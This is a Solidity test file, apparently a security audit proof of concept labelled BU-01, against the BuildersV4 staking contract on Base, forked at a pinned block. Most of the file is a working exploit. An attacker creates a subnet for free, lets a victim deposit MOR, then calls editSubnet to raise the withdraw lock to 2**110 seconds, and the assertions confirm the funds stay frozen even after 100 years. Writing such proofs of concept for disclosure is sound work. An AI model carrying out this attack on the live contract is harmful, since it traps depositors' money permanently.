// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// BU-01 PoC: a subnet admin retroactively rewrites the withdraw lock for existing stakers.
// BuildersV4 on Base (8453), forked at a pinned block. _validateSubnet checks only
// withdrawLockPeriodAfterDeposit >= minimalWithdrawLockPeriod (604800); there is NO upper bound
// and NO per-user snapshot of the lock: withdraw() reads the CURRENT subnet lock against the
// staker's stored lastDeposit. editSubnet is gated only by onlySubnetOwner (the subnet admin,
// a role anyone gets for free via permissionless createSubnet; live creation fee is 0).
// Control subnet: staker withdraws fine after the original 7-day lock.
// Attack subnet: after the victim deposits, the admin edits the lock to 2**110 seconds;
// the victim's withdraw reverts at +8 days and at +100 years. Funds stay frozen in BuildersV4.
// No protocol owner/admin/multisig is impersonated; the subnet admin is the attacker EOA itself.

interface Vm {
    function createSelectFork(string calldata url, uint256 blockNumber) external returns (uint256);
    function prank(address msgSender) external;
    function warp(uint256 newTimestamp) external;
    function load(address target, bytes32 slot) external returns (bytes32);
    function store(address target, bytes32 slot, bytes32 value) external;
    function expectRevert() external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

struct Subnet {
    string name;
    address admin;
    uint128 unusedStorage1_V4Update;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unusedStorage2_V4Update;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function depositToken() external view returns (address);
    function minimalWithdrawLockPeriod() external view returns (uint128);
}

contract BU01Test {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 58973209;
    uint128 constant HUGE_LOCK = uint128(1) << 110; // ~4.1e25 years in seconds; no uint128 overflow vs lastDeposit

    address attacker = address(0x3001); // subnet admin
    address victim = address(0x3002);
    address victim2 = address(0x3003);

    function _dealMor(address who, uint256 amount) internal {
        for (uint256 slot = 0; slot < 25; slot++) {
            bytes32 key = keccak256(abi.encode(who, slot));
            bytes32 old = vm.load(MOR, key);
            vm.store(MOR, key, bytes32(amount));
            if (IERC20(MOR).balanceOf(who) == amount) return;
            vm.store(MOR, key, old);
        }
        revert("deal slot not found");
    }

    function _assertEq(uint256 a, uint256 b, string memory what) internal pure {
        if (a != b) revert(string(abi.encodePacked("ASSERT FAIL ", what)));
    }

    function _subnet(string memory name, uint128 lock) internal view returns (Subnet memory) {
        return Subnet({
            name: name,
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: lock,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1,
            claimAdmin: attacker
        });
    }

    function _meta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata({slug: "poc", description: "poc", website: "", image: ""});
    }

    function _depositAs(address who, bytes32 subnetId, uint256 amount) internal {
        _dealMor(who, amount);
        vm.prank(who);
        IERC20(MOR).approve(BUILDERS, amount);
        vm.prank(who);
        IBuildersV4(BUILDERS).deposit(subnetId, amount);
    }

    function test_RetroactiveLockRewrite() public {
        vm.createSelectFork("https://mainnet.base.org", FORK_BLOCK);
        IBuildersV4 builders = IBuildersV4(BUILDERS);
        require(builders.depositToken() == MOR, "deposit token mismatch");
        uint128 minLock = builders.minimalWithdrawLockPeriod();
        require(minLock == 604800, "unexpected global min lock");

        // ---------- control subnet: original terms honoured ----------
        vm.prank(attacker);
        builders.createSubnet(_subnet("BU01 Control Subnet", minLock), _meta());
        bytes32 controlId = builders.getSubnetId("BU01 Control Subnet");
        _depositAs(victim, controlId, 100 ether);

        vm.warp(block.timestamp + 8 days);
        uint256 vBefore = IERC20(MOR).balanceOf(victim);
        vm.prank(victim);
        builders.withdraw(controlId, 100 ether);
        _assertEq(IERC20(MOR).balanceOf(victim), vBefore + 100 ether, "control withdraw failed");

        // ---------- attack subnet: admin rewrites the lock AFTER the victim deposited ----------
        vm.prank(attacker);
        builders.createSubnet(_subnet("BU01 Attack Subnet", minLock), _meta());
        bytes32 attackId = builders.getSubnetId("BU01 Attack Subnet");
        _depositAs(victim2, attackId, 100 ether);

        // non-admin cannot edit (control for onlySubnetOwner)
        vm.prank(victim2);
        vm.expectRevert();
        builders.editSubnet(attackId, _subnet("BU01 Attack Subnet", minLock));

        // the retroactive edit: same name, lock raised to a practically permanent value
        vm.prank(attacker);
        builders.editSubnet(attackId, _subnet("BU01 Attack Subnet", HUGE_LOCK));

        // victim cannot withdraw after the ORIGINAL 7-day term...
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim2);
        vm.expectRevert();
        builders.withdraw(attackId, 100 ether);

        // ...nor after 100 years
        vm.warp(block.timestamp + 100 * 365 days);
        vm.prank(victim2);
        vm.expectRevert();
        builders.withdraw(attackId, 100 ether);

        // the 100 MOR is still frozen inside BuildersV4 and the victim got nothing back
        _assertEq(IERC20(MOR).balanceOf(victim2), 0, "victim2 recovered funds");
        require(IERC20(MOR).balanceOf(BUILDERS) >= 100 ether, "funds not in BuildersV4");
    }
}
